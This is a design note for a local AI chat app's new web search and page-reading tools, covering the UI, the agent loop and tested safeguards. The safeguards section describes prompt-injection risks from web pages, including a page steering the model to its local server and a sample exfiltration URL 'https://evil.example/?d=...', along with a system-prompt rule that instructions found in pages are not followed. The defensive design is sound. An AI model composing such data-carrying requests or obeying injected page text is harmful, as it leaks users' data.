# Omni AI: web search

Date: 2026-10-29. Builds on `2026-10-28-ai-chat-design.md` (section "Tools and an agent loop", which this is the first use of).
Decision record: `decisions/0009-web-search-tool.md`.

## What the person sees

- In the composer the brain tile is gone. A **+** opens a small menu above the box with two switches: **Think** and **Search the web**.
  A switch that is on shows as a pill above the text (click it to turn it off), so the box itself stays uncluttered.
- With web search on, the model decides for itself whether a question needs the web. While it works the window says
  "Searching the web for …" and "Reading example.com…"; the answer ends with the pages it used, as links under the message.
- Off by default. The menu says what it costs: the model's search words go to DuckDuckGo, and pages it opens are fetched from their sites.

## How it works

`internal/websearch` does two things and knows nothing about the model: `Search(query)` (DuckDuckGo's HTML endpoint, no key, no account)
and `Read(url)` (fetch a page, keep its readable text). `internal/chat` gives the model both as tools (`web_search`, `read_page`)
when the switch is on, and runs the loop: the model answers with `tool_calls` instead of text, Omni runs them, the results go back as
`tool` messages, until the model answers in text. Measured in the spike: with `--jinja` the server returns structured `tool_calls`.

Safeguards, each of which has a test:

1. **Rounds and room.** At most 4 rounds; the last is sent without tools so it must answer. Tool results are cut to the room left in
   the context (after the history and the reply reserve), so a small context window cannot overflow; with no room the tools are not offered.
2. **No reaching into the machine.** `read_page` takes only `http`/`https`, and refuses any address that resolves to loopback, a private
   range, link-local or the metadata address, checked on the connection itself, so a redirect or a DNS trick cannot get round it.
   The chat model's own server is on `127.0.0.1` behind a token; a page that tells the model to open it gets a refusal.
3. **The web is data.** Tool results are labelled as untrusted page text, and the system prompt says instructions inside them are not
   followed. A 1.7B model is not a strong defence, so the tools can only read; none writes, opens or runs anything. And a page
   cannot make the model send data out through a fetch: `read_page` opens only addresses that came back from this answer's searches
   or that the person wrote, never one the model composed (a composed `https://evil.example/?d=...` is a GET that carries data).
   The search words are still the model's own, and go to DuckDuckGo or Wikipedia: a residual risk, named in the README.
4. **Bounded.** 10 s per request, 1.5 MB per page, HTML and plain text only, 5 results per search.
5. **Honest failures.** DuckDuckGo asks for a check after a burst of searches from one address (seen while testing: HTTP 202). The search
   then goes to Wikipedia's API, which is official, keyless and does not block, though it only knows an encyclopedia's subjects. When
   that finds nothing too, the failure is returned to the model as the tool's result, so it says it could not look instead of
   inventing an answer. The same search within ten minutes is answered from memory.
6. **A model that will not stop.** The last request has no tools and ends with "answer now". Without those words the model wrote its
   next tool call out as text, and that text was the answer (seen with thinking on).

## Not in this change

Other search engines (a key-based provider such as Brave would be a second `Searcher`; add it when DuckDuckGo's page changes or
blocks), images, citation numbering inside the text, and a per-site allow list.
